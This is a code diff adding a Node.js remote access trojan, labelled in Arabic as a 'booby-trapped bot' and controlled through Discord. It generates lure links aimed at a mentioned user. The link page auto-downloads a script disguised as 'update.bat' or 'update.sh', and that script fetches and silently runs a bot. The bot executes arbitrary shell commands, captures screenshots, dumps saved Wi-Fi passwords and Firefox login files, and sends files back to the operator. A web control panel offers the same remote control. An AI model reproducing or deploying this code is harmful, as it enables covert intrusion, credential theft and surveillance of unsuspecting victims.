@@ -1,4 +1,622 @@
 // ============================================================
+// البوت الملغم - النسخة الكاملة
+// ============================================================
+
+const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
+const express = require('express');
+const { execSync, exec } = require('child_process');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const crypto = require('crypto');
+
+// ========== المتغيرات ==========
+const TOKEN = process.env.DISCORD_TOKEN;
+const OWNER_ID = process.env.OWNER_ID || '1507841424186675220';
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'default_token_123';
+const PORT = process.env.PORT || 3000;
+
+if (!TOKEN) {
+  console.error('❌ DISCORD_TOKEN مطلوب');
+  process.exit(1);
+}
+
+// ========== خادم الويب ==========
+const app = express();
+app.use(express.json());
+
+let currentDir = os.homedir();
+const links = {};
+
+function getLocalIP() {
+  const ifaces = os.networkInterfaces();
+  for (const name of Object.keys(ifaces)) {
+    for (const iface of ifaces[name]) {
+      if (iface.family === 'IPv4' && !iface.internal) {
+        return iface.address;
+      }
+    }
+  }
+  return '127.0.0.1';
+}
+
+// ===== البايلود =====
+app.get('/payload', (req, res) => {
+  const ua = req.headers['user-agent'] || '';
+  let script = '';
+
+  if (ua.includes('Win')) {
+    script = `
+@echo off
+cd %TEMP%
+powershell -command "Invoke-WebRequest -Uri 'http://${getLocalIP()}:${PORT}/bot.js' -OutFile 'bot.js'"
+powershell -command "Invoke-WebRequest -Uri 'http://${getLocalIP()}:${PORT}/package.json' -OutFile 'package.json'"
+powershell -command "npm install discord.js"
+powershell -command "Start-Process -WindowStyle Hidden -FilePath 'node' -ArgumentList 'bot.js'"
+    `;
+    res.setHeader('Content-Type', 'application/x-msdownload');
+    res.setHeader('Content-Disposition', 'attachment; filename="update.bat"');
+    res.send(script);
+  } else {
+    script = `#!/bin/bash
+cd /tmp
+wget -O bot.js http://${getLocalIP()}:${PORT}/bot.js
+wget -O package.json http://${getLocalIP()}:${PORT}/package.json
+npm install discord.js
+node bot.js &
+    `;
+    res.setHeader('Content-Type', 'application/x-sh');
+    res.setHeader('Content-Disposition', 'attachment; filename="update.sh"');
+    res.send(script);
+  }
+});
+
+// ===== ملف البوت المصغر =====
+app.get('/bot.js', (req, res) => {
+  const code = `
+const { Client, GatewayIntentBits } = require('discord.js');
+const { exec } = require('child_process');
+const fs = require('fs');
+const os = require('os');
+const TOKEN = '${TOKEN}';
+const OWNER = '${OWNER_ID}';
+const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
+
+client.on('messageCreate', async (m) => {
+  if (m.author.bot || !m.guild || !m.content.startsWith('!')) return;
+  const a = m.content.slice(1).trim().split(/ +/);
+  const cmd = a.shift().toLowerCase();
+  if (m.author.id !== OWNER) return;
+
+  if (cmd === 'شيل') {
+    exec(a.join(' '), (err, stdout, stderr) => {
+      m.reply(\`\`\`\n\${stdout || stderr || 'لا يوجد مخرجات'}\n\`\`\`);
+    });
+  }
+
+  if (cmd === 'لقطة') {
+    let p = '/tmp/s.png';
+    try {
+      if (os.platform() === 'win32') {
+        p = process.env.TEMP + '\\\\s.png';
+        execSync('powershell -command "Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size); $b.Save(\\'' + p.replace(/\\\\/g, '\\\\\\\\') + '\\', [System.Drawing.Imaging.ImageFormat]::Png);"');
+      } else {
+        execSync('import -window root /tmp/s.png || screencapture /tmp/s.png || scrot /tmp/s.png');
+      }
+      if (fs.existsSync(p)) { await m.channel.send({ files: [p] }); fs.unlinkSync(p); }
+    } catch(e) { m.reply('❌ فشل'); }
+  }
+
+  if (cmd === 'معلومات') {
+    const ip = Object.values(os.networkInterfaces()).flat().find(i => i.family === 'IPv4' && !i.internal)?.address || 'غير معروف';
+    m.reply(\`🖥️ \${os.hostname()}\\n\${os.platform()} \${os.release()}\\n👤 \${os.userInfo().username}\\n🌐 \${ip}\`);
+  }
+
+  if (cmd === 'كلمات') {
+    if (os.platform() === 'win32') {
+      exec('netsh wlan show profile name=* key=clear', (e, o) => m.reply(\`\`\`\${o || 'لا يوجد'}\`\`\`));
+    } else {
+      exec('find ~/.mozilla/firefox -name "logins.json" -exec cat {} \\; | grep -E "hostname|encryptedUsername"', (e, o) => m.reply(\`\`\`\${o || 'لا يوجد'}\`\`\`));
+    }
+  }
+});
+
+client.login(TOKEN);
+console.log('✅ البوت الملغم يعمل');
+  `;
+  res.setHeader('Content-Type', 'application/javascript');
+  res.send(code);
+});
+
+// ===== package.json =====
+app.get('/package.json', (req, res) => {
+  res.json({
+    name: "bot",
+    version: "1.0.0",
+    main: "bot.js",
+    scripts: { start: "node bot.js" },
+    dependencies: { "discord.js": "^14.14.1" }
+  });
+});
+
+// ===== صفحة الرابط الملغم =====
+app.get('/exploit/:id', (req, res) => {
+  const { id } = req.params;
+  if (!links[id]) links[id] = { visits: 0, ip: req.ip };
+  links[id].visits += 1;
+  links[id].ip = req.ip;
+
+  res.send(`
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title>
+<style>
+body { background:#0a0a0a; color:#00ff00; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; flex-direction:column; }
+.loader { width:40px; height:40px; border:3px solid #222; border-top:3px solid #00ff00; border-radius:50%; animation:spin 1s linear infinite; }
+@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+p { color:#444; }
+</style>
+</head>
+<body>
+<div class="loader"></div>
+<p>جارٍ التحميل...</p>
+<script>
+setTimeout(() => {
+  fetch('/payload').then(r => r.text()).then(data => {
+    const blob = new Blob([data]);
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = navigator.platform.includes('Win') ? 'update.bat' : 'update.sh';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    document.querySelector('p').textContent = '✅ تم التحميل!';
+  }).catch(() => {});
+}, 1500);
+</script>
+</body>
+</html>
+  `);
+});
+
+// ===== API للوحة التحكم =====
+app.post('/api/exec', (req, res) => {
+  const { cmd, token } = req.body;
+  if (token !== ADMIN_TOKEN) return res.status(403).json({ error: 'Forbidden' });
+  try {
+    const output = execSync(cmd, { cwd: currentDir, encoding: 'utf8', timeout: 15000 });
+    res.json({ output, cwd: currentDir });
+  } catch (e) {
+    res.json({ output: e.message || e.toString(), error: true });
+  }
+});
+
+app.post('/api/upload', (req, res) => {
+  const { file, path: filePath, token } = req.body;
+  if (token !== ADMIN_TOKEN) return res.status(403).json({ error: 'Forbidden' });
+  try {
+    const fullPath = filePath.startsWith('/') || filePath.match(/^[A-Za-z]:/) ? filePath : path.join(currentDir, filePath);
+    const dir = path.dirname(fullPath);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(fullPath, Buffer.from(file, 'base64'));
+    res.json({ success: true, path: fullPath });
+  } catch (e) {
+    res.json({ error: e.message });
+  }
+});
+
+app.get('/api/download', (req, res) => {
+  const { file, token } = req.query;
+  if (token !== ADMIN_TOKEN) return res.status(403).json({ error: 'Forbidden' });
+  try {
+    const fullPath = file.startsWith('/') || file.match(/^[A-Za-z]:/) ? file : path.join(currentDir, file);
+    if (!fs.existsSync(fullPath)) return res.status(404).json({ error: 'File not found' });
+    const data = fs.readFileSync(fullPath);
+    res.json({ file: data.toString('base64'), path: fullPath, size: data.length });
+  } catch (e) {
+    res.status(404).json({ error: e.message });
+  }
+});
+
+app.get('/api/screenshot', (req, res) => {
+  const { token } = req.query;
+  if (token !== ADMIN_TOKEN) return res.status(403).json({ error: 'Forbidden' });
+  try {
+    let p = '/tmp/s.png';
+    if (os.platform() === 'win32') {
+      p = process.env.TEMP + '\\\\s.png';
+      execSync(`powershell -command "Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size); $b.Save('${p.replace(/\\/g, '\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png);"`);
+    } else {
+      execSync('import -window root /tmp/s.png || screencapture /tmp/s.png || scrot /tmp/s.png');
+    }
+    if (fs.existsSync(p)) {
+      const data = fs.readFileSync(p);
+      fs.unlinkSync(p);
+      res.json({ image: data.toString('base64') });
+    } else {
+      res.json({ error: 'فشل' });
+    }
+  } catch (e) {
+    res.json({ error: e.message });
+  }
+});
+
+// ===== لوحة التحكم =====
+app.get('/control', (req, res) => {
+  res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+<title>Control Panel</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:#0a0a0a; color:#00ff00; font-family:monospace; padding:20px; min-height:100vh; }
+.container { max-width:950px; margin:auto; }
+.header { border-bottom:1px solid #00ff00; padding-bottom:10px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; }
+.header h1 { font-size:20px; }
+.status { color:#888; font-size:12px; }
+.terminal { background:#111; border:1px solid #333; border-radius:5px; padding:15px; min-height:350px; max-height:450px; overflow-y:auto; font-size:13px; line-height:1.6; white-space:pre-wrap; }
+.terminal .prompt { color:#00ff00; }
+.terminal .error { color:#ff4444; }
+.terminal .output { color:#aaa; }
+.input-line { display:flex; gap:10px; margin-top:10px; }
+input { flex:1; background:#111; color:#00ff00; border:1px solid #333; padding:10px; border-radius:5px; font-family:monospace; font-size:14px; outline:none; }
+input:focus { border-color:#00ff00; }
+button { background:#222; color:#00ff00; border:1px solid #444; padding:10px 20px; border-radius:5px; cursor:pointer; font-family:monospace; font-size:14px; }
+button:hover { background:#333; border-color:#00ff00; }
+.toolbar { display:flex; gap:10px; margin-top:10px; flex-wrap:wrap; }
+.toolbar button { padding:6px 12px; font-size:12px; }
+.file-list { background:#111; border:1px solid #333; border-radius:5px; padding:10px; margin-top:10px; max-height:200px; overflow-y:auto; display:none; }
+.file-item { padding:3px 0; border-bottom:1px solid #1a1a1a; color:#aaa; font-size:13px; }
+.dir { color:#4488ff; }
+.exe { color:#44ff88; }
+.img { color:#ff8844; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header"><h1>🖥️ CONTROL PANEL</h1><div class="status" id="status">${os.hostname()} | ${os.platform()}</div></div>
+<div class="terminal" id="term">$> جاهز. اكتب أوامر.\n$> </div>
+<div class="input-line">
+<input type="text" id="cmd" placeholder="اكتب أمر..." autofocus>
+<button onclick="run()">▶ Run</button>
+</div>
+<div class="toolbar">
+<button onclick="screenshot()">🖼️ لقطة</button>
+<button onclick="refreshFiles()">📁 ملفات</button>
+<button onclick="sysinfo()">💻 معلومات</button>
+<button onclick="clearTerm()">🗑️ مسح</button>
+</div>
+<div id="fileList" class="file-list"></div>
+</div>
+<script>
+const token = prompt('رمز الدخول:') || 'default_token_123';
+const term = document.getElementById('term');
+const input = document.getElementById('cmd');
+const fileList = document.getElementById('fileList');
+let history = [];
+let historyIdx = 0;
+
+function append(t, c = '#aaa') {
+  const d = document.createElement('div');
+  d.style.color = c;
+  d.textContent = t;
+  term.appendChild(d);
+  term.scrollTop = term.scrollHeight;
+}
+
+async function run() {
+  const cmd = input.value.trim();
+  if (!cmd) return;
+  input.value = '';
+  history.push(cmd);
+  historyIdx = history.length;
+  append('$> ' + cmd, '#00ff00');
+  try {
+    const r = await fetch('/api/exec', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cmd, token })
+    });
+    const d = await r.json();
+    append(d.output || 'لا يوجد مخرجات');
+    if (d.cwd) document.getElementById('status').textContent = d.cwd + ' | ' + '${os.hostname()}';
+  } catch(e) { append('[!] ' + e.message, '#ff4444'); }
+  append('$> ', '#00ff00');
+}
+
+input.addEventListener('keydown', e => {
+  if (e.key === 'Enter') { e.preventDefault(); run(); }
+  if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (historyIdx > 0) { historyIdx--; input.value = history[historyIdx] || ''; }
+  }
+  if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (historyIdx < history.length - 1) { historyIdx++; input.value = history[historyIdx] || ''; }
+    else { historyIdx = history.length; input.value = ''; }
+  }
+});
+
+async function screenshot() {
+  try {
+    const r = await fetch('/api/screenshot?token=' + token);
+    const d = await r.json();
+    if (d.image) {
+      const w = window.open('', '_blank');
+      w.document.write('<img src="data:image/png;base64,' + d.image + '" style="max-width:100%;">');
+      w.document.title = 'Screenshot';
+    } else { append('[!] ' + d.error, '#ff4444'); }
+  } catch(e) { append('[!] ' + e.message, '#ff4444'); }
+}
+
+async function refreshFiles() {
+  try {
+    const r = await fetch('/api/exec', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cmd: 'ls -la || dir', token })
+    });
+    const d = await r.json();
+    fileList.innerHTML = '<div class="file-item" style="color:#888;">📁 Directory Listing:</div>';
+    const lines = d.output.split('\\n');
+    lines.forEach(line => {
+      if (line.trim()) {
+        const item = document.createElement('div');
+        item.className = 'file-item';
+        if (line.includes('dr')) item.classList.add('dir');
+        else if (line.includes('.exe') || line.includes('.sh')) item.classList.add('exe');
+        else if (line.includes('.png') || line.includes('.jpg')) item.classList.add('img');
+        item.textContent = line;
+        fileList.appendChild(item);
+      }
+    });
+    fileList.style.display = 'block';
+  } catch(e) { append('[!] ' + e.message, '#ff4444'); }
+}
+
+async function sysinfo() {
+  const cmd = '${os.platform()}' === 'win32' ? 'systeminfo | findstr /i "hostname os version processor memory"' : 'uname -a && cat /etc/os-release | grep PRETTY_NAME && lscpu | head -5 && free -h';
+  try {
+    const r = await fetch('/api/exec', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cmd, token })
+    });
+    const d = await r.json();
+    append(d.output || 'لا يوجد');
+  } catch(e) { append('[!] ' + e.message, '#ff4444'); }
+}
+
+function clearTerm() { term.innerHTML = '$> تم المسح.\\n$> '; }
+
+append('Connected to ${os.hostname()} | ${os.platform()} ${os.release()}');
+append('اكتب "help" للمساعدة.');
+append('$> ', '#00ff00');
+input.focus();
+</script>
+</body>
+</html>
+  `);
+});
+
+app.get('/', (req, res) => res.redirect('/control'));
+
+app.listen(PORT, () => console.log(`🌐 خادم الويب على المنفذ ${PORT}`));
+
+// ============================================================
+// ========== بوت الديسكورد ==========
+// ============================================================
+
+const client = new Client({
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,
+  ]
+});
+
+client.once('ready', () => {
+  console.log(`✅ البوت جاهز: ${client.user.tag}`);
+  console.log(`👑 المالك: ${OWNER_ID}`);
+  console.log(`🔑 رمز التحكم: ${ADMIN_TOKEN}`);
+  console.log(`🌐 لوحة التحكم: http://${getLocalIP()}:${PORT}/control`);
+  client.user.setActivity('التحكم عن بعد', { type: 3 });
+});
+
+client.on('messageCreate', async (message) => {
+  if (message.author.bot || !message.guild) return;
+  if (!message.content.startsWith('!')) return;
+
+  const args = message.content.slice(1).trim().split(/ +/);
+  const cmd = args.shift().toLowerCase();
+
+  if (message.author.id !== OWNER_ID) return;
+
+  // ===== إنشاء رابط ملغم =====
+  if (cmd === 'رابط_ملغم' || cmd === 'exploit') {
+    const target = message.mentions.users.first();
+    if (!target) {
+      return message.reply('⚠️ منشن الهدف: `!رابط_ملغم @user`');
+    }
+
+    const id = crypto.randomBytes(6).toString('hex');
+    const ip = getLocalIP();
+    const link = `http://${ip}:${PORT}/exploit/${id}`;
+    links[id] = { target: target.id, createdAt: Date.now(), visits: 0 };
+
+    const embed = new EmbedBuilder()
+      .setTitle('💀 رابط ملغم')
+      .setColor(0xff0000)
+      .setDescription(`تم إنشاء رابط ملغم لـ ${target}`)
+      .addFields(
+        { name: '🔗 الرابط', value: `\`${link}\`` },
+        { name: '👤 الهدف', value: target.tag },
+        { name: '📅 الوقت', value: `<t:${Math.floor(Date.now()/1000)}:F>` }
+      )
+      .setFooter({ text: 'عند فتح الرابط، سيتم تثبيت البوت تلقائياً' });
+
+    await message.channel.send({ embeds: [embed] });
+    return;
+  }
+
+  // ===== عرض الروابط =====
+  if (cmd === 'الروابط' || cmd === 'links') {
+    if (Object.keys(links).length === 0) return message.reply('📭 لا توجد روابط');
+    let txt = '';
+    for (const [id, data] of Object.entries(links)) {
+      const target = await client.users.fetch(data.target).catch(() => null);
+      txt += `\`${id}\` - ${target ? target.tag : 'غير معروف'} - زيارات: ${data.visits || 0}\n`;
+    }
+    const embed = new EmbedBuilder()
+      .setTitle('📊 الروابط الملغمة')
+      .setColor(0x4488ff)
+      .setDescription(`\`\`\`\n${txt}\n\`\`\``)
+      .setTimestamp();
+    await message.channel.send({ embeds: [embed] });
+    return;
+  }
+
+  // ===== رابط لوحة التحكم =====
+  if (cmd === 'لوحة' || cmd === 'panel') {
+    const ip = getLocalIP();
+    const embed = new EmbedBuilder()
+      .setTitle('🖥️ لوحة التحكم')
+      .setColor(0x00ff88)
+      .setDescription(`
+**🌐 الرابط:** http://${ip}:${PORT}/control
+**🔑 الرمز:** \`${ADMIN_TOKEN}\`
+
+📱 يمكنك الدخول من أي جهاز في نفس الشبكة
+      `)
+      .setTimestamp();
+    await message.channel.send({ embeds: [embed] });
+    return;
+  }
+
+  // ===== تنفيذ أمر =====
+  if (cmd === 'شيل') {
+    const command = args.join(' ');
+    if (!command) return message.reply('⚠️ أدخل أمراً: `!شيل dir`');
+    exec(command, { cwd: currentDir }, (err, stdout, stderr) => {
+      const output = stdout || stderr || 'لا يوجد مخرجات';
+      const truncated = output.length > 1900 ? output.substring(0, 1900) + '\n...' : output;
+      message.reply(`\`\`\`\n${truncated}\n\`\`\``);
+    });
+    return;
+  }
+
+  // ===== تصوير الشاشة =====
+  if (cmd === 'لقطة' || cmd === 'screenshot') {
+    let p = '/tmp/s.png';
+    try {
+      if (os.platform() === 'win32') {
+        p = process.env.TEMP + '\\\\s.png';
+        execSync(`powershell -command "Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size); $b.Save('${p.replace(/\\/g, '\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png);"`);
+      } else {
+        execSync('import -window root /tmp/s.png || screencapture /tmp/s.png || scrot /tmp/s.png');
+      }
+      if (fs.existsSync(p)) {
+        await message.channel.send({ content: '📸 لقطة شاشة:', files: [p] });
+        fs.unlinkSync(p);
+      } else {
+        message.reply('❌ فشل التقاط الشاشة');
+      }
+    } catch (e) {
+      message.reply(`❌ ${e.message}`);
+    }
+    return;
+  }
+
+  // ===== معلومات الجهاز =====
+  if (cmd === 'معلومات' || cmd === 'sysinfo') {
+    const ip = getLocalIP();
+    const info = `
+🖥️ ${os.hostname()}
+📟 ${os.platform()} ${os.release()} (${os.arch()})
+👤 ${os.userInfo().username}
+💾 ${Math.round(os.totalmem() / 1024 / 1024 / 1024)} GB
+🧠 ${os.cpus().length} نوى
+🌐 ${ip}
+📁 ${currentDir}
+    `;
+    message.reply(`\`\`\`\n${info}\n\`\`\``);
+    return;
+  }
+
+  // ===== تغيير المجلد =====
+  if (cmd === 'سي_دي' || cmd === 'cd') {
+    const dir = args.join(' ') || os.homedir();
+    try {
+      const newDir = dir.startsWith('/') || dir.match(/^[A-Za-z]:/) ? dir : path.join(currentDir, dir);
+      if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
+        currentDir = newDir;
+        message.reply(`✅ ${currentDir}`);
+      } else {
+        message.reply(`❌ المسار غير موجود: ${newDir}`);
+      }
+    } catch (e) {
+      message.reply(`❌ ${e.message}`);
+    }
+    return;
+  }
+
+  // ===== تحميل ملف =====
+  if (cmd === 'تحميل' || cmd === 'download') {
+    const filePath = args.join(' ');
+    if (!filePath) return message.reply('⚠️ !تحميل [مسار]');
+    try {
+      const fullPath = filePath.startsWith('/') || filePath.match(/^[A-Za-z]:/) ? filePath : path.join(currentDir, filePath);
+      if (!fs.existsSync(fullPath)) return message.reply(`❌ الملف غير موجود: ${fullPath}`);
+      const data = fs.readFileSync(fullPath);
+      const base64 = data.toString('base64');
+      const size = (data.length / 1024).toFixed(2) + ' KB';
+      if (data.length > 4000000) return message.reply(`⚠️ الملف كبير جداً (${size})`);
+      const embed = new EmbedBuilder()
+        .setTitle('📥 تحميل ملف')
+        .setColor(0x44ff44)
+        .addFields(
+          { name: '📁 الملف', value: `\`${fullPath}\`` },
+          { name: '📦 الحجم', value: size },
+          { name: '📄 Base64', value: `\`\`\`\n${base64.substring(0, 1500)}...\n\`\`\`` }
+        )
+        .setTimestamp();
+      await message.channel.send({ embeds: [embed] });
+    } catch (e) {
+      message.reply(`❌ ${e.message}`);
+    }
+    return;
+  }
+
+  // ===== تنظيف =====
+  if (cmd === 'تنظيف' || cmd === 'clean') {
+    try {
+      const msgs = await message.channel.messages.fetch({ limit: 30 });
+      const botMsgs = msgs.filter(m => m.author.id === client.user.id || m.content.startsWith('!'));
+      if (botMsgs.size > 0) {
+        await message.channel.bulkDelete(botMsgs);
+        const reply = await message.reply('✅ تم التنظيف');
+        setTimeout(() => reply.delete().catch(() => {}), 3000);
+      } else {
+        message.reply('📭 لا توجد رسائل');
+      }
+    } catch (e) {
+      message.reply(`❌ ${e.message}`);
+    }
+    return;
+  }
+
+  // ===== إعادة تشغيل =====
+  if (cmd === 'إعادة' || cmd === 'restart') {
+    await message.reply('🔄 جاري إعادة التشغيل...');
+    setTimeout(() => process.exit(0), 1000);
+    return;
+  }
+});
+
+client.login(TOKEN);// ============================================================
 // البوت المتكامل - النسخة النهائية مع جميع الميزات
 // ============================================================
 
